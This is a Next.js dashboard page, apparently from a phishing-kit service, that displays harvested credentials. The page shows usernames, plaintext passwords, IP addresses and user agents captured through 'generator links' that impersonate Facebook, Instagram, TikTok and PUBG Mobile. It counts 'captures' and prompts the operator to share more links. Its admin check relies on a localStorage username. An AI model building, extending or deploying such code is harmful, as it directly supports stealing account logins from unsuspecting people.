"use client";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";

export default function DashboardPage() {
  const router = useRouter();
  const [data, setData] = useState([]);
  const [loading, setLoading] = useState(true);
  const [errorStatus, setErrorStatus] = useState(null);
  const [isAdmin, setIsAdmin] = useState(false);
  const [userName, setUserName] = useState("");

  useEffect(() => {
    const fetchData = async () => {
      try {
        setLoading(true);
        setErrorStatus(null);

        const storedName = localStorage.getItem("aura_user_name") || "";
        const storedId = localStorage.getItem("aura_user_id");
        const isCleared = localStorage.getItem("aura_gateway_cleared_v1") === "true";

        if (!storedId || !isCleared) {
          router.replace("/");
          return;
        }

        setUserName(storedName);
        setIsAdmin(storedName.toLowerCase() === "admin" || storedName.toLowerCase() === "stupidking");

        const response = await fetch(`/api/vault?userId=${storedId}`);
        const json = await response.json();

        if (!response.ok) {
          setErrorStatus(json.message || json.error || "Failed to load results");
          setData([]);
          return;
        }

        if (Array.isArray(json)) {
          setData(json);
        } else {
          setData([]);
        }
      } catch (err) {
        console.error("Dashboard fetch error", err);
        setErrorStatus("Connection error. Please check your network.");
        setData([]);
      } finally {
        setLoading(false);
      }
    };

    fetchData();
  }, [router]);

  const deleteEntry = (id) => {
    setData(data.filter(item => item.id !== id));
  };

  return (
    <div className="main-container animate-fade-in py-6 sm:py-12">
      <header className="mb-8 sm:mb-12 flex flex-col sm:flex-row sm:items-center justify-between gap-6">
        <div>
          <h1 className="text-2xl sm:text-4xl font-bold mb-2 tracking-tight">
            My <span className="text-gradient">Dashboard</span>
          </h1>
          <p className="text-slate-500 text-xs sm:text-sm font-medium">
            {userName ? `Welcome back, ${userName} 👋` : "All your captured results appear here."}
          </p>
        </div>
        <div className="flex flex-col sm:flex-row gap-3">
          {isAdmin && (
            <Link
              href="/admin"
              className="w-full sm:w-auto px-6 py-3 bg-indigo-600 hover:bg-indigo-700 text-white border border-indigo-500 rounded-xl sm:rounded-2xl text-[10px] sm:text-xs font-black uppercase tracking-widest transition-all shadow-lg shadow-indigo-200 active:scale-95 text-center flex items-center justify-center gap-2"
            >
              <span>Admin Panel</span>
              <span>⚡</span>
            </Link>
          )}
          <Link
            href="/generator"
            className="w-full sm:w-auto px-6 py-3 bg-slate-900 hover:bg-slate-800 text-white rounded-xl sm:rounded-2xl text-[10px] sm:text-xs font-black uppercase tracking-widest transition-all shadow-sm active:scale-95 text-center flex items-center justify-center gap-2"
          >
            <span>Generator</span>
            <span>🔗</span>
          </Link>
          <button
            onClick={() => window.location.reload()}
            className="w-full sm:w-auto px-6 py-3 bg-white/60 hover:bg-white border border-white/50 rounded-xl sm:rounded-2xl text-[10px] sm:text-xs font-black uppercase tracking-widest text-slate-600 transition-all shadow-sm active:scale-95 glass"
          >
            Refresh
          </button>
          <button
            onClick={() => {
              localStorage.removeItem("aura_gateway_cleared_v1");
              localStorage.removeItem("aura_user_name");
              localStorage.removeItem("aura_user_id");
              window.location.href = "/";
            }}
            className="w-full sm:w-auto px-6 py-3 bg-red-50 hover:bg-red-100 border border-red-100 rounded-xl sm:rounded-2xl text-[10px] sm:text-xs font-black uppercase tracking-widest text-red-500 transition-all shadow-sm active:scale-95"
          >
            Logout 🚪
          </button>
        </div>
      </header>

      {/* Stats Row */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-8">
        {[
          { label: "Total Captures", value: loading ? "—" : data.length, icon: "🔗" },
          { label: "Last 24h", value: loading ? "—" : data.filter(d => new Date(d.timestamp) > new Date(Date.now() - 86400000)).length, icon: "🎯" },
          { label: "Tools Used", value: loading ? "—" : new Set(data.map(d => d.tool)).size, icon: "🛠️" },
          { label: "Success Rate", value: "100%", icon: "📈" },
        ].map((stat, i) => (
          <div key={i} className="glass-card p-4 sm:p-6 rounded-2xl relative overflow-hidden">
            <div className="text-2xl sm:text-3xl mb-2">{stat.icon}</div>
            <p className="text-[10px] sm:text-xs font-black uppercase tracking-widest text-slate-400 mb-1">{stat.label}</p>
            <p className="text-xl sm:text-3xl font-black text-slate-900">{stat.value}</p>
          </div>
        ))}
      </div>

      {/* Results Table */}
      <div className="glass-card rounded-2xl overflow-hidden border-slate-200">
        <div className="overflow-x-auto">
          <table className="w-full text-left">
            <thead>
              <tr className="bg-slate-50 text-slate-400 text-[10px] sm:text-xs font-bold uppercase tracking-widest">
                <th className="px-3 sm:px-8 py-4 sm:py-5">Source</th>
                <th className="px-3 sm:px-8 py-4 sm:py-5">User Info</th>
                <th className="px-4 py-5 hidden md:table-cell">Details</th>
                <th className="px-4 py-5 hidden sm:table-cell">Time</th>
                <th className="px-3 sm:px-8 py-4 sm:py-5 text-right">Action</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-100">
              {loading ? (
                <tr>
                  <td colSpan="5" className="px-8 py-20 text-center text-slate-400 font-medium">Loading results...</td>
                </tr>
              ) : errorStatus ? (
                <tr>
                  <td colSpan="5" className="px-8 py-20 text-center">
                    <div className="bg-rose-50 border border-rose-100 p-4 rounded-xl inline-block">
                      <p className="text-rose-600 font-bold mb-1">Error Loading Data</p>
                      <p className="text-rose-500 text-xs">{errorStatus}</p>
                    </div>
                  </td>
                </tr>
              ) : data.length === 0 ? (
                <tr>
                  <td colSpan="5" className="px-8 py-20 text-center text-slate-400 font-medium">No results yet. Share your generator links!</td>
                </tr>
              ) : (
                data.map((entry) => (
                  <tr key={entry.id} className="hover:bg-slate-50/50 transition-colors">
                    <td className="px-3 sm:px-8 py-4 sm:py-6">
                      <div className="flex items-center gap-2 sm:gap-3">
                        <div className="w-8 h-8 sm:w-10 sm:h-10 rounded-lg sm:rounded-xl bg-indigo-50 flex items-center justify-center text-base sm:text-lg border border-indigo-100 shadow-sm shrink-0">
                          {entry.tool === "Facebook" ? "👤" : entry.tool === "Instagram" ? "📸" : entry.tool === "TikTok" ? "🎵" : entry.tool === "PUBG Mobile" ? "🔫" : "🌙"}
                        </div>
                        <div className="min-w-0">
                          <span className="block font-bold text-slate-800 text-xs sm:text-base truncate">{entry.tool}</span>
                          <span className="block text-[8px] sm:text-[10px] font-mono text-slate-400">/t/{entry.toolId}</span>
                        </div>
                      </div>
                    </td>
                    <td className="px-3 sm:px-8 py-4 sm:py-6">
                      <div className="flex flex-col gap-1 sm:gap-1.5">
                        <div className="flex items-center gap-1.5 sm:gap-2">
                          <span className="text-[8px] sm:text-[10px] text-slate-400 font-bold uppercase tracking-tighter shrink-0">UID:</span>
                          <span className="text-[10px] sm:text-sm font-bold text-indigo-600 break-all bg-indigo-50 px-1.5 sm:px-2 py-0.5 rounded">{entry.username}</span>
                        </div>
                        <div className="flex items-center gap-1.5 sm:gap-2">
                          <span className="text-[8px] sm:text-[10px] text-slate-400 font-bold uppercase tracking-tighter shrink-0">PWD:</span>
                          <span className="text-[10px] sm:text-sm font-bold text-pink-600 break-all bg-pink-50 px-1.5 sm:px-2 py-0.5 rounded">{entry.password}</span>
                        </div>
                      </div>
                    </td>
                    <td className="px-4 py-6 hidden md:table-cell">
                      <div className="flex flex-col">
                        <span className="text-sm text-slate-700 font-bold font-mono">{entry.ip}</span>
                        <span className="text-[10px] text-slate-400 truncate max-w-[150px] font-medium">{entry.userAgent}</span>
                      </div>
                    </td>
                    <td className="px-4 py-6 hidden sm:table-cell">
                      <span className="text-xs text-slate-500 font-medium">{new Date(entry.timestamp).toLocaleString()}</span>
                    </td>
                    <td className="px-3 sm:px-8 py-4 sm:py-6 text-right">
                      <button
                        onClick={() => deleteEntry(entry.id)}
                        className="p-2 sm:p-2.5 hover:bg-red-50 rounded-lg sm:rounded-xl transition-colors group border border-transparent hover:border-red-100"
                        title="Delete record"
                      >
                        <span className="text-red-400/60 group-hover:text-red-500 text-sm sm:text-base">🗑️</span>
                      </button>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
